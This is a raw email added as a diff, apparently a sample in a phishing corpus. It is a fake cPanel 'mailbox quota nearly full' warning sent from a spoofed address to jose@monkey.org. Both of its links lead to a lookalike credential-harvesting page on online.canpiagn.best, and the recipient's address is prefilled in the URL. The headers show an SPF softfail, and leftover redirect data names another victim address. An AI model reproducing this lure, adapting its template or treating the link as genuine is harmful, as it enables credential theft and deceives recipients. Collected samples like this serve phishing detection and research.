@@ -1,0 +1,129 @@
+From jose@monkey.org Thu May 11 03:33:30 2023 +0000
+Return-Path: cpanel@monkey.org
+Delivered-To: jose@monkey.org
+X-FDA: 80776554180.11.E666AAE
+Received: from monkey.org (unknown [185.222.58.45])
+	by imf09.b.hostedemail.com (Postfix) with ESMTP id C86D218004B
+	for <jose@monkey.org>; Thu, 11 May 2023 03:33:27 +0000 (UTC)
+Authentication-Results: imf09.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf09.b.hostedemail.com: 185.222.58.45 is neither permitted nor denied by domain of cpanel@monkey.org) smtp.mailfrom=cpanel@monkey.org;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1683776009;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=m4L56UrQCzmxXDOE7/6VRc6t/duKhmutVPMaXB6e/iw=;
+	b=Ni8h5jkWOAG5fo3QF//TA+Ym04Rh6vdV5Pg/j2b4St7RWpcYXAHU4JBcLtgfkDAs+YlAkx
+	UAixbCzv64z216QTU7SWdpsEZaAo3mmgAYlYFfRQW5goN1Jorzn4zrhfSlPeLqjEjEfddd
+	auU9HWXOHVfzHtP3iMoxjJJfq5kKVNE=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1683776009; a=rsa-sha256;
+	cv=none;
+	b=dWCukd4bFTddO8j3hHmdwOn0JP8auw1ImPp54qVhguISgqFn3sPqccSJhk5T/9Bc8y1OWF
+	w5saZMFKV9a03F61iPgiBeZrKBAmRxiGqFsrnU2OP2wOoocX7501kEdCk4lqxPLE2nqlzF
+	3oUIeGveaDy/rNU3UGI37Qj2I4sRWpo=
+ARC-Authentication-Results: i=1;
+	imf09.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf09.b.hostedemail.com: 185.222.58.45 is neither permitted nor denied by domain of cpanel@monkey.org) smtp.mailfrom=cpanel@monkey.org;
+	dmarc=none
+From: cPanel on monkey.org <cpanel@monkey.org>
+To: jose@monkey.org
+Subject: RE:QOUTE
+Date: 11 May 2023 05:33:25 +0200
+Message-ID: <20230511053325.D5905FFA53910C1A@monkey.org>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam12
+X-Rspam-User: 
+X-Spam-Status: No, score=8.25
+X-Stat-Signature: sqieoihwjs7mi5sh68brcrbrqaoxmsyb
+X-Rspamd-Queue-Id: C86D218004B
+X-HE-Tag: 1683776007-61385
+X-HE-Meta: U2FsdGVkX18kTajUY6DFllprGGewW1dkC/QacwoOL8ltagsaZhdn0Uxq4Iymg8pzfB2DaQANTjy9pEB246NgExCbc9Gn4jB81rgqZ3MtJcYi5lc8+nrGCdWHZRKvQGwOtf5W/Ao00sbinwmGKLFH1GXaPOMTAGy1YiL0Be6tljz6RzA+QA+o5BdiaPKC4RYwNr20JwShcMUMvC/yL3IWPyTNiQzLE4pO0gxUEN5Gp/4=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 106
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<table width=3D"680" style=3D"color: rgb(44, 54, 58); font-family: Roboto,s=
+ans-serif; font-size: 14px; border-collapse: collapse; max-width: 680px; ba=
+ckground-color: rgb(244, 244, 244);" border=3D"0" cellspacing=3D"0" cellpad=
+ding=3D"0"><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing=
+: border-box;"><td width=3D"680" height=3D"25" style=3D'color: rgb(51, 51, =
+51); font-family: "Helvetica Neue",Helvetica,Arial,sans-serif; font-size: 1=
+6px; box-sizing: border-box;'>
+Mailbox quota notification for "<a style=3D"color: inherit; box-sizing: bor=
+der-box; background-color: transparent;">jose@monkey.org".</td></tr><tr sty=
+le=3D"box-sizing: border-box;"><td style=3D"border-width: 2px; border-style=
+: solid; border-color: rgb(232, 232, 232) rgb(232, 232, 232) rgb(255, 108, =
+44); padding: 15px 0px 20px; box-sizing: border-box; background-color: rgb(=
+255, 255, 255);">
+<table width=3D"680" style=3D'font-family: "Helvetica Neue",Helvetica,Arial=
+,sans-serif; border-collapse: collapse;' border=3D"0" cellspacing=3D"0" cel=
+lpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-si=
+zing: border-box;"><td width=3D"15" style=3D"box-sizing: border-box;">&nbsp=
+;</td><td width=3D"650" style=3D"box-sizing: border-box;"><table width=3D"1=
+00%" style=3D"width: 650px; height: 292px; border-collapse: collapse;" bord=
+er=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;"><tr style=3D"height: 164px; box-si=
+zing: border-box;"><td style=3D"height: 164px; box-sizing: border-box;"><p =
+style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">The=
+ "<a style=3D"color: inherit; box-sizing: border-box; background-color: tra=
+nsparent;">jose@monkey.org</a>" email account is nearly full.</p><p style=
+=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">
+The email account currently uses 91.9% (497.59&nbsp;MB/500&nbsp;MB) of its =
+capacity.</p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: =
+border-box;">You
+ should remove some emails from the mailbox as soon as possible in order
+ to prevent the loss of any future email. Use the Email Disk Usage tool=20
+at&nbsp;<a style=3D"color: rgb(0, 172, 255); box-sizing: border-box; backgr=
+ound-color: transparent; text-decoration-line: none;" href=3D"https://onlin=
+e.canpiagn.best/configurators.html?val=3Djose@monkey.org" target=3D"_blank"=
+ rel=3D"noreferrer" data-saferedirecturl=3D"https://www.google.com/url?q=3D=
+https://online.canpiagn.best/configurators.html?val%3Dinfo@fassocs.com&amp;=
+source=3Dgmail&amp;ust=3D1683645200817000&amp;usg=3DAOvVaw3DhXhk9mVtNUehhO9=
+2MtUG">https://online.canpiagn.<wbr>best/configurators.html?val=3D<wbr>
+jose@monkey.org</a>, or ask the system administrator to upgrade your accoun=
+t to a larger quota.</p></td></tr><tr style=3D"height: 128px; box-sizing: b=
+order-box;"><td style=3D"height: 128px; box-sizing: border-box;"><div style=
+=3D"color: rgb(102, 102, 102); padding-top: 5px; font-size: 12px; margin-to=
+p: 5px; border-top-color: rgb(232, 232, 232); border-top-width: 2px; border=
+-top-style: solid; box-sizing: border-box;"><p style=3D"margin: 5px 0px 0px=
+; padding: 0px; box-sizing: border-box;">
+The system generated this notice on wednesday,&nbsp;may 10, 2023 at 8:35:13=
+ AM UTC.</p></div><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-siz=
+ing: border-box;">
+You can disable the "Quota::MailboxWarning" type of notification through th=
+e cPanel interface:&nbsp;<a style=3D"color: rgb(0, 172, 255); box-sizing: b=
+order-box; background-color: transparent; text-decoration-line: none;" href=
+=3D"https://online.canpiagn.best/configurators.html?val=3Djose@monkey.org" =
+target=3D"_blank" rel=3D"noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://online.canpi=
+agn.best/configurators.html?val%3Dinfo@fassocs.com&amp;source=3Dgmail&amp;u=
+st=3D1683645200817000&amp;usg=3DAOvVaw3DhXhk9mVtNUehhO92MtUG">https://onlin=
+e.<wbr>canpiagn.best/configurators.<wbr>html?val=3Djose@monkey.org</a></p><=
+p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">D=
+o not reply to this automated message.</p></td></tr></tbody></table></td><t=
+d width=3D"15" style=3D"box-sizing: border-box;">&nbsp;</td></tr>
+</tbody></table></td></tr><tr style=3D"box-sizing: border-box;"><td align=
+=3D"center" style=3D"padding-top: 10px; box-sizing: border-box;"><p style=
+=3D'margin: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: "Hel=
+vetica Neue",Helvetica,Arial,sans-serif; font-size: 12px; box-sizing: borde=
+r-box;'><img style=3D"border-color: rgb(0, 0, 0); vertical-align: middle; b=
+ox-sizing: border-box;"><br style=3D"box-sizing: border-box;">Copyright&cop=
+y;&nbsp;2023 cPanel, L.L.C.</p></td></tr></tbody></table><p>
+</p>
+
+
+</body></html>
